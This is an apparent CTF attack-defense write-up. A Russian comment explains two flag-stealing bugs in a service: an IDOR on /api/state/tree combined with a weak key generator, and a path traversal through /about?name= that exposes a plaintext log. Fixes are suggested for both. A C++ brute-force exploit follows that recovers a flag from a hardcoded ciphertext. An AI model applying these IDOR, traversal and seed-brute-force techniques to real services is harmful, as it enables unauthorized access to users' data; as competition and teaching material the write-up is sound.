/*

В сервисе присутствует 2 возможности красть флаги

1) IDOR + Небезопасное генерирование seed

В ручке /api/state/tree присутствовал IDOR, который позволял читать чужие сохраненные стейты зашифрованных деревьев.
Id пользователей были autoincrement, что позволяло получать деревья предыдущих пользователей.
Для расшифровки сообщений на дереве надо было понять как шифруется сообщение. Используется дерево отрезков с множественными операциями на дереве
http://e-maxx.ru/algo/segment_tree
Для генерирования ключа в функции gen_key небезопасно создавался ключ на основе введенной строки.
Битовые сдвиги в конце функции обнуляли первые 16 бит, что позволяло перебрать все варианты ключа и сбрутить правильный.
Для шифрования 1000 раз генерировались случайные параметры l, r, v и вызывался xor на дереве отрезков для элементов с l по r значением v.
Эксплойт для брута приведен ниже.
Для фикса возможно было увеличить количество итераций с 1000 до 100000, чтобы усложнить брут.

2) 
В api ручке /about?name=<login> при указании длинного параметра login выдавалась пустая страница.
Если посмотреть логи, которые писались в log.txt, можно было обнаружить ошибки "Template xxx not found", где xxx - это часть параметра login с определенной позиции.
Даже без реверса бинаря можно понять, что подав строку ../log.txt в параметр name и добив нужным количеством символом в начале, можно прочитать файл log.txt.
В этот файл писались plaintext строки еще до их шифрования.
Для фикса можно было уменьшить третий параметр функции strncat в обработке ручки /about или просто отключить логи в entry.sh. 
*/

#include <vector>
#include <string>
#include <map>
#include <algorithm>

#include "tree.cpp"
#include "crow.h"

using namespace std;

#define N 64
#define ITERATIONS 1000


int gen_key(const string& key_str){
    int ret = 1e7;
    // xor with multiplied symbols
    for (auto c: key_str) {
        ret ^= c;
        ret ^= (c * 2) << 2;
        ret ^= (c * 4) << 4;
        ret ^= (c * 8) << 8;
        ret ^= (c * 16) << 16;
    }
    // xor and add more numbers
    for (int i = 0; i < 50; i++) {
        for (auto c: key_str) {
            ret *= c;
            ret += i;
            ret ^= 0xBEEF;
            ret = ret >> 2;
        }
    }
    // make cycle shifts and xor
    ret ^= ret % 8;
    ret = ret >> 2;
    ret ^= ret % 8;
    ret = ret << 4;
    ret ^= ret % 8;
    ret = ret >> 8;
    ret ^= ret % 8;
    ret = ret << 16;
    ret ^= ret % 8;
    if (ret < 0) ret *= -1;
    return ret;
}

int main(){
    string data = "Cnw/dnhjeRoeewZ9LHZMDywHQFRxIUI6cF8TJxUVAUg7Yh8BOxIrOjUhE31hEWouEiUgSRZ0FDNLZS4fNFlSKQ==";
    string decoded = crow::utility::base64decode(data, data.size());
    cout << "started\n";
    for (int z = 0; z < 1<<16; z++) {
        array<unsigned int, 128> tmp_tree = {};
        build_tree(1, 0, N - 1, decoded, tmp_tree);
        srand(z<<16);
        for (int i = 0; i < ITERATIONS; i++) {
            int l = rand() % N;
            int r = rand() % N;
            if (r < l) swap(l, r);
            int v = rand() % 127;
            update_tree(1, 0, N - 1, l, r, v, tmp_tree);
        }
        string ret = "";
        traverse_tree(1, 0, N - 1, 0, tmp_tree, ret);
        if (ret[0] == int('I') && ret[1] == int('n') && ret[2] == int('n') && ret[3] == int('o')){
            cout << ret << endl;
        }
    }
}
